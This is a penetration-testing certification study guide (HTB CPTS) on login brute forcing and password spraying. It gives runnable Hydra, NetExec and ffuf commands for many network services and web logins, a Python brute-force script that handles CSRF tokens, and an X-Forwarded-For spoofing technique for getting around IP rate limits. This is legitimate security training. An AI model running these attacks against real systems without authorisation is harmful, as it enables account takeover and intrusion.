Systematic credential testing across network services and web authentication endpoints combines **username enumeration**, **tailored wordlist generation**, and **lockout-safe password spraying or brute forcing**. This practical guide covers the full **HTB CPTS Module #16 (Login Brute Forcing)** workflow.

<Warning>
**Check Account Lockout Policy First**

In Active Directory or enterprise targets, check the password lockout threshold (`nxc smb DC_IP -u USER -p 'PASSWORD' --pass-pol` or `rpcclient -U "" -N DC_IP -c "getdompwinfo"`) before running multi-password attacks. Spray **one password across many users**, never many passwords against a single domain user without checking `BadPwdCount`.
</Warning>

## 1. Custom Wordlist & Username Generation

### Generate Permuted Corporate Usernames (`username-anarchy`)

Turn OSINT employee full names (`First Last`) into standard corporate login formats (`flast`, `first.last`, `firstl`, `lastf`):

```bash
cat << 'EOF' > fullnames.txt
Jane Doe
John Smith
EOF

username-anarchy -i fullnames.txt > usernames.txt
```

### Scrape Target-Specific Password Base Words (`CeWL`)

```bash
# Crawl target site to depth 2, minimum word length 5, lowercase included
cewl -d 2 -m 5 --lowercase -w cewl_words.txt http://TARGET_IP/

# Mutate base words with Hashcat best64 rules for realistic passwords (Word2024!, etc.)
hashcat --force cewl_words.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mutated_passwords.txt
```

### Default Credentials & Service Wordlists

- **SecLists Default Credentials:** `/usr/share/seclists/Passwords/Default-Credentials/` (`ftp-betterdefaultpasslist.txt`, `ssh-betterdefaultpasslist.txt`, `tomcat-betterdefaultpasslist.txt`, `default-passwords.csv`).

## 2. Network Service Login Brute Forcing (`Hydra` & `NetExec`)

### Service Decision Matrix

| Service / Port | Recommended Command | Notes & Flags |
| --- | --- | --- |
| **SSH (22)** | `hydra -L users.txt -P pass.txt -t 4 ssh://TARGET_IP` | Use `-t 4` to avoid `MaxStartups` connection drops |
| **FTP (21)** | `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TARGET_IP` | `-C` takes `user:pass` colon-separated pairs |
| **SMB (445)** | `nxc smb TARGET_IP -u users.txt -p 'Password123!' --continue-on-success` | Add `--local-auth` if testing local accounts instead of AD |
| **WinRM (5985)** | `nxc winrm TARGET_IP -u users.txt -p pass.txt` | Confirms interactive `evil-winrm` shell access |
| **RDP (3389)** | `hydra -L users.txt -p 'Password123!' rdp://TARGET_IP` | Or `nxc rdp TARGET_IP -u users.txt -p 'Password123!'` |
| **MSSQL (1433)** | `nxc mssql TARGET_IP -u users.txt -p pass.txt --local-auth` | Drop `--local-auth` for Windows domain auth |
| **MySQL (3306)** | `hydra -l root -P pass.txt mysql://TARGET_IP` | Or `nxc mysql TARGET_IP -u root -p pass.txt` |
| **POP3 / IMAP** | `hydra -L users.txt -P pass.txt pop3://TARGET_IP` | Add `-S -s 995` (POP3S) or `-S -s 993` (IMAPS) for TLS |

## 3. Web Login Form & Basic Auth Brute Forcing

### HTTP Basic / Digest Authentication

```bash
# Hydra http-get against Basic Auth endpoint (use -s for non-default HTTP port)
hydra -L users.txt -P pass.txt -u TARGET_IP -s 8080 http-get /admin/

# ffuf Basic Auth using base64-encoded user:pass pairs
ffuf -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt:FUZZ \
  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64encode -fc 401
```

- `-u` in Hydra iterates through users before moving to the next password (lockout-safer).

### HTML POST Login Forms (`http-post-form`)

1. Capture the failed login request in Burp or browser DevTools.
2. Note the exact **endpoint path** (`/login.php`), **POST body format** (`username=^USER^&password=^PASS^`), and **exact failure string** (`F=Invalid credentials` or `S=302` for redirect on success):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password" -V -t 16
```

### JSON API Login Endpoints (`ffuf`)

When the login endpoint expects `Content-Type: application/json`:

```bash
ffuf -w users.txt:USER -w pass.txt:PASS \
  -u http://TARGET_IP/api/login -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"USER","password":"PASS"}' \
  -fr 'Invalid|Unauthorized' -fc 401
```

## 4. Handling CSRF Tokens, Lockouts & IP Rate Limits

### Login Forms with Dynamic CSRF Tokens

Standard Hydra `http-post-form` cannot fetch a fresh anti-CSRF token per attempt. Use a 15-line Python `requests.Session()` script or Burp Intruder Pitchfork/Grep-Extract macro:

```python
#!/usr/bin/env python3
import re, requests

url = "http://TARGET_IP/login.php"
with open("passwords.txt") as f:
    for pwd in (line.strip() for line in f if line.strip()):
        s = requests.Session()
        r0 = s.get(url, timeout=5)
        token = re.search(r'name="csrf_token"\s+value="([^"]+)"', r0.text).group(1)
        r1 = s.post(url, data={"username": "admin", "password": pwd, "csrf_token": token}, allow_redirects=False)
        if r1.status_code in (301, 302) or "Invalid" not in r1.text:
            print(f"[+] FOUND: admin : {pwd}")
            break
```

### Bypassing Weak IP Rate Limiting via Spoofed Headers

If the application blocks your IP after N failed attempts, check whether it trusts proxy forwarding headers (`X-Forwarded-For`, `X-Real-IP`, or `Client-IP`) by pairing each password attempt with a distinct spoofed IP in `pitchfork` mode (or `127.0.0.1` if localhost is allowlisted):

```bash
# Generate one spoofed IP per password line, then step through both wordlists in lockstep
awk '{printf "10.%d.%d.%d\n", int(NR/65025)%255, int(NR/255)%255, NR%254+1}' pass.txt > ips.txt

ffuf -mode pitchfork -w pass.txt:PASS -w ips.txt:CLIENT_IP \
  -u http://TARGET_IP/login.php -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Forwarded-For: CLIENT_IP' \
  -d 'username=admin&password=PASS' -fr 'Invalid'
```

## 5. Skills Assessment Checklist (Login Brute Forcing)

1. **Harvest Names & Context:** Crawl the public site with `cewl` and extract staff names to build a permuted username list with `username-anarchy`.
2. **Test Web Login / Basic Auth:** Identify the login form or Basic Auth prompt, verify the exact failure condition, and test generated usernames against default/CeWL-mutated passwords.
3. **Pivot Credentials to Services (SSH / FTP / SMB):** Immediately test any recovered web credential across SSH (`22`), FTP (`21`), or SMB (`445`)—credential reuse between web portals and system accounts is standard in CPTS assessments.
